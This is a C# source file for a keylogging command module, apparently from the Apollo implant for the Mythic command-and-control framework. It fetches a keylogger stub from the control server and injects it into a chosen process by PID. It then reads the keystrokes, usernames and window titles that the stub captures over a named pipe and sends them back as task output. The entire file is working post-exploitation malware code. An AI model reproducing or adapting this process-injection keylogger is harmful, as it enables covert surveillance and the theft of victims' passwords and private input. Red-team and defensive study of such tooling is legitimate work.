#define COMMAND_NAME_UPPER

#if DEBUG
#undef KEYLOG
#define KEYLOG
#endif

#if KEYLOG

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Reflection = System.Reflection;
using Apollo.Jobs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.IO.Pipes;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.IO;
using IPC;
using Apollo.Tasks;
using System.Threading;
using System.Reflection;
using Apollo.Evasion;
using System.ComponentModel.Design.Serialization;
using Mythic.Structs;
using Apollo.MessageInbox;

namespace Apollo.CommandModules
{
    class Keylog
    {
        public struct KeylogArguments
        {
            public int pid;
            public string pipe_name;
            public string file_id;
        }
        public static void Execute(Job job, Agent implant)
        {
            Task task = job.Task;
            byte[] loggerStub;
            ApolloTaskResponse progressResp;
            KeylogArguments args = JsonConvert.DeserializeObject<KeylogArguments>(task.parameters);
            if (args.pid < 0)
            {
                job.SetError("PID must be non-negative.");
                return;
            }
            if (string.IsNullOrEmpty(args.pipe_name))
            {
                job.SetError("No pipe was given to connect to.");
                return;
            }
            if (string.IsNullOrEmpty(args.file_id))
            {
                job.SetError("No file ID was given to retrieve.");
                return;
            }
            try
            {
                System.Diagnostics.Process.GetProcessById(args.pid);
            } catch (Exception ex)
            {
                job.SetError($"Failed to find process with PID {args.pid}. Reason: {ex.Message}");
                return;
            }

            loggerStub = implant.Profile.GetFile(job.Task.id, args.file_id, implant.Profile.ChunkSize);
            if (loggerStub == null || loggerStub.Length == 0)
            {
                job.SetError("Failed to fetch keylogger stub from server.");
                return;
            }
            var injectionType = Injection.InjectionTechnique.GetInjectionTechnique();
            var injectionHandler = (Injection.InjectionTechnique)Activator.CreateInstance(injectionType, new object[] { loggerStub, (uint)args.pid });
            //Injection.CreateRemoteThreadInjection crt = new Injection.CreateRemoteThreadInjection(loaderStub, (uint)pid);


            if (injectionHandler.Inject())
            {
                BinaryFormatter bf = new BinaryFormatter();
                bf.Binder = new IPC.KeystrokeMessageBinder();
                NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", args.pipe_name, PipeDirection.InOut);
                try
                {
                    pipeClient.Connect(30000);
                    job.OnKill = delegate ()
                    {
                        try
                        {
                            if (pipeClient.IsConnected)
                                bf.Serialize(pipeClient, new IPC.KillLoggerMessage());
                            job.SetComplete("Stopped keylogger.");
                        }
                        catch (Exception ex)
                        { }
                    };
                    job.AddOutput($"Connected to keylogger. Processing keystrokes.");
                    while (true)
                    {
                        KeystrokeMessage msg = new KeystrokeMessage();
                        try
                        {
                            msg = (IPC.KeystrokeMessage)bf.Deserialize(pipeClient);
                            ApolloTaskResponse resp = new ApolloTaskResponse()
                            {
                                task_id = task.id,
                                user = msg.User,
                                window_title = msg.WindowTitle,
                                keystrokes = msg.Keystrokes
                            };
                            job.AddOutput(resp);
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                } catch (Exception ex)
                {
                    job.SetError($"Something went wrong: {ex.Message}");
                }
            }
        }
    }
}

#endif